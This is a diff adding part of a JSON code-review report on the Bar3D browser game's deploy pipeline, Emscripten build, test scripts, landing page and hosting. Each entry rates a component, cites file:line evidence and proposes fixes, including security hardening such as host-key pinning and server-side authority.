+   "rewriteNotes": "The Room DO becomes the authority. It assigns session ids and resume secrets, verifies IONOS tickets locally (so it knows names and badges), and owns seats, machines, the jukebox and glass ownership: claim and release messages are validated on the server and stamped with server time. It broadcasts at a fixed tick (e.g. 20 Hz), batching all player states into one message per client instead of one message per state. The world is persisted with alarms. Add per-socket rate limits, an Origin allowlist and a protocol version, and later binary state packets. Use one transport family (WebSocket, plus HTTP long-poll on the same Worker only if truly needed). D1 holds durable game data (lap times, leaderboards, room snapshots). R2 holds user uploads, served with immutable caching and CORP. Optionally the Worker mints short-lived Cloudflare TURN credentials for voice. CI deploys with wrangler (worker first, then writes config.json). Track DO requests, duration and rows written against free-tier limits."
+  },
+  {
+   "name": "Deploy pipeline (.github/workflows/deploy.yml)",
+   "files": [
+    ".github/workflows/deploy.yml"
+   ],
+   "purpose": "On every push to main it installs emsdk 6.0.12 (cached), builds Release, stamps the build sha, writes version.txt, cancels stuck Pages deployments, and force-pushes build/site to gh-pages. It then uploads the site, relay.php, account.php, .htaccess and the homepage to IONOS over SFTP with lftp.",
+   "rating": 5,
+   "compatibility": "Not relevant to iOS. GitHub Pages is static only: max-age=600 and no custom headers (so no COOP/COEP and no no-cache for index.html). IONOS is Apache.",
+   "delay": "Roughly 4-8 minutes from commit to live (build plus the Pages build), then up to 10 minutes of browser cache unless the version.txt reload kicks in. The IONOS upload replaces files one by one over several minutes, serving a mix of versions in the meantime.",
+   "frameCost": "None.",
+   "syncRisk": "Medium. Two live copies (github.io and joshuavelasco.com/bar) can serve different builds. A partial IONOS upload mixes app.js and app.wasm from different builds. Nothing orders the server (Worker, PHP) deploys against the client deploy. cancel-in-progress can stop the IONOS upload halfway.",
+   "problems": [
+    {
+     "issue": "The IONOS upload isn't atomic, and a newer push can cancel it halfway, leaving new app.js with old app.wasm (or vice versa), which aborts startup.",
+     "severity": "medium",
+     "evidence": "deploy.yml:16-18 `cancel-in-progress: true`; :104 mirror, then :106 mput of index.html/app.js/app.wasm afterwards.",
+     "fix": "Upload into a new versioned folder (bar/b/<sha>/) and switch a tiny index.html or redirect last. Or use content-hashed filenames and upload index.html last. Put the upload job in its own concurrency group that never cancels a running upload."
+    },
+    {
+     "issue": "The always-uploaded file list leaves out menu.js and voice.js, while mirror --ignore-time only sends files whose size changed. A same-size edit to menu.js, voice.js or a model never reaches IONOS.",
+     "severity": "medium",
+     "evidence": "deploy.yml:106 `mput index.html version.txt app.js app.wasm audio.js net.js account.js project.json relay.php account.php .htaccess`; :104 `mirror -R --verbose --ignore-time`.",
+     "fix": "Use hashed filenames, or generate the mput list from web/*.js, or mirror with --only-newer and without --ignore-time."
+    },
+    {
+     "issue": "No tests run before publishing.",
+     "severity": "medium",
+     "evidence": "deploy.yml:50-58 builds, and publishing follows directly; smoke, mp, account and cloud tests never run in CI.",
+     "fix": "Add a test job: smoke.mjs (Playwright + SwiftShader works on ubuntu runners), `php -l server/*.php`, and the worker tests against wrangler dev or Miniflare. Publish only if it passes."
+    },
+    {
+     "issue": "The SFTP host key is accepted blindly, so a man in the middle could capture the IONOS password.",
+     "severity": "medium",
+     "evidence": "deploy.yml:98 `set sftp:auto-confirm yes` with password auth (:91, LFTP_PASSWORD).",
+     "fix": "Pin the host key in a known_hosts file stored as a secret/variable, run ssh with StrictHostKeyChecking=yes through `set sftp:connect-program`, and use an SSH key if IONOS allows it."
+    },
+    {
+     "issue": "Cloudflare isn't wired in: no wrangler deploy and no config for clients.",
+     "severity": "medium",
+     "evidence": "There is no CLOUDFLARE_* step. net.js:303 fetches cloud.json, which is never produced.",
+     "fix": "Add a deploy-cloud job (when CLOUDFLARE_API_TOKEN is set): `npx wrangler@4.42.0 deploy` in cloud/, capture the URL, write build/site/config.json, and run it before publishing the site."
+    },
+    {
+     "issue": "apt-get install runs without apt-get update, which fails intermittently on stale runner images.",
+     "severity": "low",
+     "evidence": "deploy.yml:53 `sudo apt-get install -y ninja-build`; :93 `sudo apt-get install -y lftp`.",
+     "fix": "Run `sudo apt-get update -qq` first, or install ninja with pip."
+    },
+    {
+     "issue": "Broad write permissions for the whole job, which also runs third-party tooling cloned from an unpinned HEAD.",
+     "severity": "low",
+     "evidence": "deploy.yml:11-14 contents:write + pages:write job-wide; :46 `git clone --depth 1 https://github.com/emscripten-core/emsdk.git`.",
+     "fix": "Split into a read-only build job and a publish job, passing an artifact. Pin emsdk to a tag or commit."
+    },
+    {
+     "issue": "This repo deploys the landing page for the whole domain.",
+     "severity": "low",
+     "evidence": "deploy.yml:102-103 puts homepage/index.php and .htaccess into home/.",
+     "fix": "Move the homepage to its own repo (DECISIONS already plans this)."
+    }
+   ],
+   "verdict": "refactor",
+   "rewriteNotes": "Jobs in order: build (read-only token; pinned emsdk; site artifact with content-hashed assets, manifest and a config.json template), then test (smoke, php -l, worker tests in Miniflare), then deploy-cloud (wrangler, DO migrations), then deploy-site (Cloudflare Pages via `wrangler pages deploy`, with _headers: index.html and config.json no-cache, hashed files immutable, COOP/COEP when ready; gh-pages kept only as a mirror or retired), then deploy-ionos (PHP API and homepage only, atomic folder switch, pinned host key). A post-deploy check_live run fails the workflow if the expected sha isn't live."
+  },
+  {
+   "name": "Build configuration (CMakeLists.txt)",
+   "files": [
+    "CMakeLists.txt",
+    "engine/fetch.cpp"
+   ],
+   "purpose": "The Emscripten build of engine/ + app/ into app.js/app.wasm (-O3 + closure in Release). It embeds shaders/ through MEMFS, copies web/ and assets/ into build/site, and gzips the models (the engine unpacks them with DecompressionStream).",
+   "rating": 7,
+   "compatibility": "emdawnwebgpu port and -sENVIRONMENT=web. ALLOW_MEMORY_GROWTH works on iOS, but each growth step can stall. Closure renames unquoted properties inside EM_ASM/EM_JS in Release only (a documented gotcha).",
+   "delay": "Runtime: there is no INITIAL_MEMORY, so the heap starts at Emscripten's 16 MB default and grows repeatedly during loading, while about 31 MB of decompressed models pass through it. fetch.cpp copies each model JS chunks \u2192 bytes \u2192 _malloc \u2192 std::vector (fetch.cpp:79-92, :53). Each growth can copy the heap and recreate the memory views. Build: all 31 MB of models are re-gzipped with -9 on every build (est. 3-6 s).",
+   "frameCost": "Indirect: heap growth during loading (verify by logging wasmMemory.buffer.byteLength after load). The embedded MEMFS adds filesystem runtime code to app.js.",
+   "syncRisk": "None.",
+   "problems": [
+    {
+     "issue": "No INITIAL_MEMORY or MAXIMUM_MEMORY, so the heap grows in repeated steps during loading (a likely contributor to the loading stutter, to be measured).",
+     "severity": "medium",
+     "evidence": "CMakeLists.txt:21-31 sets only -sALLOW_MEMORY_GROWTH=1.",
+     "fix": "Measure the peak and set -sINITIAL_MEMORY to it (e.g. 192-256 MB), plus -sMAXIMUM_MEMORY=1GB. Hand fetched bytes straight into a buffer C++ owns instead of malloc then vector."
+    },
+    {
+     "issue": "Closure can silently break bridge calls in Release only, and CI never runs a non-closure or debug build.",
+     "severity": "medium",
+     "evidence": "CMakeLists.txt:32-36 (--closure=1 only in Release; ASSERTIONS only in Debug); DECISIONS gotcha about quoted property names.",
+     "fix": "Move bridge JS into --js-library files with closure externs. Add a CI lint that flags unquoted window/DOM property access in EM_ASM blocks, and run the smoke test on the Release build (already done locally)."
+    },
+    {
+     "issue": "web/ is copied twice at the same time with no dependency between the copies, so Ninja can write the same files concurrently.",
+     "severity": "low",
+     "evidence": "POST_BUILD copy_directory web (CMakeLists.txt:43-46) and the site_assets target (:49-51) both copy web/ into build/site.",
+     "fix": "Keep one staging step that depends on app."
+    },
+    {
+     "issue": "The models are re-gzipped on every build.",
+     "severity": "low",
+     "evidence": "CMakeLists.txt:55 `gzip -9 -n -f .../*.glb` after copy_directory, unconditionally.",
+     "fix": "Use one add_custom_command per .glb, with OUTPUT .glb.gz and DEPENDS on the .glb."
+    },
+    {
+     "issue": "No asset hashing or manifest, so asset URLs can't be cached long-term.",
+     "severity": "low",
+     "evidence": "Assets are fetched at fixed paths: renderer.cpp:520 'assets/models/' + file + '.gz', jukebox.cpp:45, piano.cpp:107.",
+     "fix": "A build step writes manifest.json mapping names to hashed paths, and C++ resolves names through it."
+    },
+    {
+     "issue": "Embedding shaders through --embed-file pulls in the filesystem runtime.",
+     "severity": "low",
+     "evidence": "CMakeLists.txt:23 `--embed-file=${CMAKE_SOURCE_DIR}/shaders@/shaders`.",
+     "fix": "Generate a C++ header with the WGSL as string constants."
+    },
+    {
+     "issue": "Stack size isn't set and warnings don't fail the build.",
+     "severity": "low",
+     "evidence": "No -sSTACK_SIZE (Emscripten's default is small, 64 KB) and no -Werror (CMakeLists.txt:19).",
+     "fix": "Set -sSTACK_SIZE=1MB explicitly, keep STACK_OVERFLOW_CHECK in a CI debug run, and add -Werror for engine/."
+    }
+   ],
+   "verdict": "refactor",
+   "rewriteNotes": "Two presets (release, debug-ci). Release: -O3 --closure=1, explicit INITIAL/MAXIMUM_MEMORY and STACK_SIZE, a generated shader header, hashed assets plus a manifest from properly dependent custom commands, a single staging step, -Werror on engine/. A -pthread variant comes later, behind a flag and only when hosting sends COOP/COEP, for physics, race and asset-parsing workers only; WebGPU stays on the main thread."
+  },
+  {
+   "name": "Test and ops tools (tools/*.mjs)",
+   "files": [
+    "tools/smoke.mjs",
+    "tools/check_live.mjs",
+    "tools/shots.mjs",
+    "tools/mp_test.mjs",
+    "tools/voice_test.mjs",
+    "tools/account_test.mjs",
+    "tools/rhythm_test.mjs",
+    "tools/cloud_test.mjs"
+   ],
+   "purpose": "Headless Chromium + SwiftShader WebGPU tests: smoke (load and screenshots), check_live (load the deployed site), shots (screenshots with page options), mp_test (2-3 players through a local PHP relay, or CLOUD=), voice_test (WebRTC with a fake mic), account_test (signup, profile, card), rhythm_test, and cloud_test (raw WebSocket protocol test against wrangler dev).",
+   "rating": 6,
+   "compatibility": "Chromium and SwiftShader only. They can't measure iPhone Safari performance or WebKit behaviour (AAC, the audio unlock, outputLatency, COEP).",
+   "delay": "None at runtime.",
+   "frameCost": "None at runtime. The tests don't measure frame cost either.",
+   "syncRisk": "None at runtime, but the multiplayer and cloud tests aren't run automatically, so protocol regressions can ship.",
+   "problems": [
+    {
+     "issue": "The smoke test's pass rule is weak: a build whose models never finish loading still passes.",
+     "severity": "medium",
+     "evidence": "smoke.mjs:41-42 only prints '(models still loading after 120 s)'; :89 `ok = errors.length === 0 && log.includes('Running.')`.",
+     "fix": "Require 'Everything loaded' within N seconds, and check that the screenshot isn't blank (pixel variance)."
+    },
+    {
+     "issue": "Nothing measures performance or hitches, although loading and start stutter is the top complaint.",
+     "severity": "medium",
+     "evidence": "No tool reads frame times; only the status text is captured (smoke.mjs:47).",
+     "fix": "Expose frame-time stats from C++ (window.bar3dPerf = {maxFrameMs, p95, longFrames, heapBytes}). Assert in smoke on long frames after enter (relative to a SwiftShader baseline), and add PerformanceObserver('longtask')."
+    },
+    {
+     "issue": "No test runs in CI, and cloud_test needs a manually started wrangler dev.",
+     "severity": "medium",
+     "evidence": "cloud_test.mjs:2 '(cd cloud && npx wrangler dev --port 8787) then: node tools/cloud_test.mjs'; deploy.yml has no test step.",
+     "fix": "Add a CI job that starts wrangler dev (or vitest with @cloudflare/vitest-pool-workers) and php -S, and runs the suites."
+    },
+    {
+     "issue": "The same static server and browser launch code is copied into 6+ scripts, and the copies have drifted.",
+     "severity": "low",
+     "evidence": "smoke.mjs:22-37, shots.mjs:12-28, mp_test.mjs:23-44, account_test.mjs:20-42, rhythm_test.mjs:22-36, voice_test.mjs:19-40 (each with different 404 handling and default content types).",
+     "fix": "Share tools/lib/site.mjs and tools/lib/browser.mjs."
+    },
+    {
+     "issue": "No security or abuse tests.",
+     "severity": "low",
+     "evidence": "account_test.mjs and cloud_test.mjs cover only the happy path.",
+     "fix": "Add negative cases: bad and expired tokens, id takeover, oversized and flooding messages, brute-force lockout."
+    },
+    {
+     "issue": "check_live doesn't verify that the expected build is the one that loaded.",
+     "severity": "low",
+     "evidence": "check_live.mjs:18 prints the build without comparing it.",
+     "fix": "Take the expected sha as an argument or env var and exit non-zero on a mismatch."
+    }
+   ],
+   "verdict": "refactor",
+   "rewriteNotes": "Shared helpers, plus a CI 'test' job that gates deploys: smoke (loads, no errors, everything loaded, perf budget), cloud protocol tests including abuse cases in Miniflare, accounts API tests against php -S with a MySQL service container, and mp_test via CLOUD. After deploy, check_live asserts the sha. Performance is still judged on the phone, but an in-app ?perf overlay (frame-time graph, heap, pending GPU jobs) gives the user something to screenshot."
+  },
+  {
+   "name": "Landing page (homepage/ + web/project.json)",
+   "files": [
+    "homepage/index.php",
+    "homepage/.htaccess",
+    "web/project.json"
+   ],
+   "purpose": "The joshuavelasco.com root page. It lists every subfolder that has a project.json; Bar3D's entry comes from web/project.json.",
+   "rating": 8,
+   "compatibility": "Plain PHP/HTML; works on iOS.",
+   "delay": "One PHP glob per visit (negligible), with Cache-Control: no-cache.",
+   "frameCost": "None.",
+   "syncRisk": "None.",
+   "problems": [
+    {
+     "issue": "Every Bar3D deploy also overwrites the root page and its .htaccess.",
+     "severity": "low",
+     "evidence": "deploy.yml:102-103.",
+     "fix": "Move it to its own repo, as DECISIONS already suggests."
+    },
+    {
+     "issue": "No security headers at the domain root (which home/bar/account.php also inherits).",
+     "severity": "low",
+     "evidence": "homepage/.htaccess:1-4 has only DirectoryIndex and Options -Indexes.",
+     "fix": "Add HSTS, X-Content-Type-Options: nosniff and Referrer-Policy through mod_headers in the root .htaccess."
+    }
+   ],
+   "verdict": "keep",
+   "rewriteNotes": "It stays on IONOS. Add security headers at the root, and once the game moves to Cloudflare Pages, redirect /bar/ to the one canonical game URL (one origin, one localStorage, one login). Move it to its own repo."
+  },
+  {
+   "name": "Hosting, caching, versioning and cross-origin isolation",
+   "files": [
+    "web/index.html",
+    ".github/workflows/deploy.yml",
+    "CMakeLists.txt",
+    "app/renderer.cpp",
+    "docs/DECISIONS.md"
+   ],
+   "purpose": "How the game is served and refreshed: GitHub Pages (max-age=600, no custom headers) plus a second live copy on IONOS. Only JS and wasm are cache-busted (?v=<sha>), and a version.txt check reloads stale pages. The plan is to move to Cloudflare Pages with COOP/COEP for threads.",
+   "rating": 5,
+   "compatibility": "GitHub Pages can't send COOP/COEP. The coi-serviceworker workaround forces an extra reload on the first visit and could double-reload together with the version.txt logic. Safari supports COEP require-corp but, as far as known, not 'credentialless', so under isolation every cross-origin subresource needs CORS or CORP. That breaks the account.js <img> avatars (account.js:111-112, no crossOrigin), unless account.php adds CORP. Avatars loaded by C++ through fetch() use CORS mode and are fine given ACAO *. WebSocket and WebRTC are unaffected. Music must stay same-origin or use CORS + crossOrigin (createMediaElementSource needs that anyway). Emscripten pthreads + ALLOW_MEMORY_GROWTH slows JS access to the heap, and WebGPU objects can only be used on the main thread.",
+   "delay": "max-age=600 means up to 10 minutes of stale index.html (the version.txt fix costs one extra full load). Models, music and MIDI have no version in their URLs, so after a deploy a client can run the new wasm with model files up to 10 minutes old. Nothing gets long-lived immutable caching, so returning visitors revalidate about 30 files per visit.",
+   "frameCost": "None directly.",
+   "syncRisk": "Medium. Clients of different versions can share a room (old cached clients plus new ones) with no protocol check. The two game origins keep separate localStorage, so a player has a different login and name on each.",
+   "problems": [
+    {
+     "issue": "Only JS and wasm are cache-busted; assets use fixed URLs.",
+     "severity": "medium",
+     "evidence": "index.html:137, :143, :150 add ?v=build. renderer.cpp:520, jukebox.cpp:45 and piano.cpp:107 use plain paths.",
+     "fix": "Use hashed filenames from a manifest, served as immutable."
+    },
+    {
+     "issue": "GitHub Pages gives no control over headers (no no-cache for index.html, no immutable assets, no COOP/COEP).",
+     "severity": "medium",
+     "evidence": "DECISIONS 'Pages sends cache-control: max-age=600'; CLAUDE.md iOS constraints.",
+     "fix": "Serve the game from Cloudflare Pages with a _headers file: index.html and config.json `Cache-Control: no-cache`; hashed assets `public, max-age=31536000, immutable`; `Cross-Origin-Opener-Policy: same-origin` + `Cross-Origin-Embedder-Policy: require-corp` once avatars and R2 send CORP/CORS."
+    },
+    {
+     "issue": "Two live game origins double the surface: separate tokens and settings, and possibly different builds.",
+     "severity": "medium",
+     "evidence": "deploy.yml:75-109 publishes to gh-pages AND mirrors to IONOS home/bar; net.js:34 has different relay logic per host.",
+     "fix": "Pick one canonical origin (Cloudflare Pages, later bar.joshuavelasco.com through a CNAME). Redirect the others."
+    },
+    {
+     "issue": "The version.txt reload becomes dead weight and could clash with a COI service worker.",
+     "severity": "low",
+     "evidence": "index.html:90-103.",
+     "fix": "Remove it once index.html is served no-cache."
+    }
+   ],
+   "verdict": "rewrite",
+   "rewriteNotes": "Cloudflare Pages serves the static game. Its 25 MiB per-file limit is fine: the largest gzipped model is 1.5 MB and the songs are about 4 MB. A _headers file sets caching and COOP/COEP. Assets get content hashes and a manifest. config.json (no-cache) carries the build sha, protocol version, ws URL and accounts URL. The Worker lives on the same Cloudflare account: workers.dev for now, and a custom subdomain only if DNS moves to Cloudflare. Turn on cross-origin isolation only after avatars send CORP (or come from R2 through the Worker with CORP), <img> tags use crossOrigin, and music is same-origin. Threads come later, for physics, race and asset parsing; the main-thread hitches need fixing first, because they aren't caused by a lack of parallelism. IONOS keeps the accounts API, homepage, email and domains."
+  }
+ ],
+ "crossCutting": [
+  "Trust boundary is in the wrong place. Clients choose their own ids (worker.js:114, relay.php:57), enforce badges themselves (menu.js:293), and can write any world key (worker.js:172-189). Page options can redirect tokens to any host (net.js:30-36 and :298-301, account.js:330-331 and :347). Fix: the Room DO becomes the authority and verifies short-lived Ed25519 tickets from IONOS locally, and the client honours server URLs only from an allowlist.",
+  "Silent fallbacks and swallowed errors hide real failures: cloud.json 404 \u2192 relay (net.js:303-305; the deploy never writes cloud.json); 3 failed connects or 'room full' \u2192 a separate relay room, so phones split into two rooms (net.js:136-143); setInfo parse errors ignored (menu.js:378); version.txt errors ignored (index.html:102); checkToken failures ignored (worker.js:230). Each fallback should show on the HUD status and be reported remotely.",
+  "Error handling on the phone: every error auto-opens a log panel covering about 40% of the screen that swallows touches (index.html:82). Add severity levels, a HUD error badge, and a Worker /log endpoint (build sha + UA + message), since the user can't open devtools. This is the single biggest lever for 'fewer errors'.",
+  "Configuration is scattered and partly inferred: DEFAULT_SERVER in net.js:18, the accounts URL derived from the relay URL (account.js:331), cloud.json that is never written, and ACCOUNT_URL in wrangler.toml:11. Replace them with one config.json written by the deploy (build sha, protocol version, ws URL, accounts URL, assets base), plus a protocol version in every hello/request.",
+  "Version skew: the client, Worker, relay and account.php have no shared protocol version; there are two game origins; Pages caches pages for 10 minutes; IONOS uploads aren't atomic (deploy.yml:104-106). Deploy order should be: Worker first, then the client; the server tells outdated clients to reload.",
+  "Loading and start stutter run through this group: the opaque HTML overlay sits over a canvas that renders the full scene every frame from onGpuReady onward (main.cpp:1400 starts the loop before loading; runJobs gets 8 ms, then 3 ms after enter, main.cpp:1233). There are 14 synchronous CreateRenderPipeline calls and no CreateRenderPipelineAsync, so pipelines compile on first use: hitches when the mirror, race or rhythm game first appear. GLB parsing runs inside the fetch callback (model.cpp:177-186). The heap grows from the 16 MB default (no INITIAL_MEMORY). fetch.cpp copies each model 3 times. 'Ready' should mean: downloads done, GPU jobs drained, all pipelines created async and warmed with an off-screen draw, and no full scene rendering under the overlay.",
+  "Bridge architecture: about 70 EM_ASM/EM_JS call sites (audio.cpp 27, net.cpp 18, main.cpp 14, ui.cpp 6, ...), several doing string/JSON round trips every frame (ui.cpp:11-19, net.cpp receiveWorld/receiveEvents), and all closure-sensitive (quoted names). Consolidate into a typed exchange (one call in, one call out per frame, with binary buffers in the wasm heap), JS-library files with externs, and a CI lint.",
+  "Cloudflare cost and free-tier budget: 20 Hz state per player plus a 2 s heartbeat keeps the DO awake (no hibernation while anyone is in a room), every world change writes storage (worker.js:187), and each state is one message per recipient. Batch broadcasts at a fixed server tick, persist with alarms, and watch DO requests, duration and rows written before inviting more players.",
+  "Data safety: account and room data live inside the deploy target folder (home/bar/accounts, home/bar/rooms), protected only by .htaccess RedirectMatch, with no backups. Only the absence of --delete in deploy.yml:104 keeps them from being wiped. Move accounts to IONOS MySQL (PDO, transactions, UNIQUE username), put any remaining files outside the docroot, and take nightly dumps.",
+  "IONOS \u2194 Cloudflare link: IONOS shared-hosting MySQL is only reachable from IONOS PHP, so the Worker must never need it on the hot path. The account id (12 hex) is the join key between IONOS users and D1 game data (lap times, friends). Ed25519 tickets signed by PHP (sodium, built in) and verified in the Worker (crypto.subtle) replace the per-hello HTTP call (worker.js:221-232), and also replace relay.php's direct reads of account files (relay.php:136-137).",
+  "Modal and input coordination: account (#acctRoot) and menu (#menuRoot) panels both use z-index 8 with independent open state. C++ knows about neither (net.cpp:80 panelOpen is unused), so the game keeps rendering at full cost under a backdrop blur (account.js:62). One modal manager should notify C++ to pause look input and throttle rendering.",
+  "Repo hygiene: cloud/.wrangler/state/*.sqlite and .wrangler/tmp bundles are committed to the public repo (git ls-files cloud); .gitignore lacks .wrangler/.",
+  "Voice depends on Google STUN only (voice.js:16, REMASTER item). Cloudflare's TURN service could be minted per session by the same Worker (short-lived credentials), keeping all live infrastructure on Cloudflare.",
+  "No test gates any deploy, and performance is never measured automatically. Add a CI test job (smoke with loaded/blank/perf assertions, Miniflare worker tests including abuse cases, accounts API tests) and an in-app ?perf overlay the user can screenshot on the iPhone."
+ ]
+}
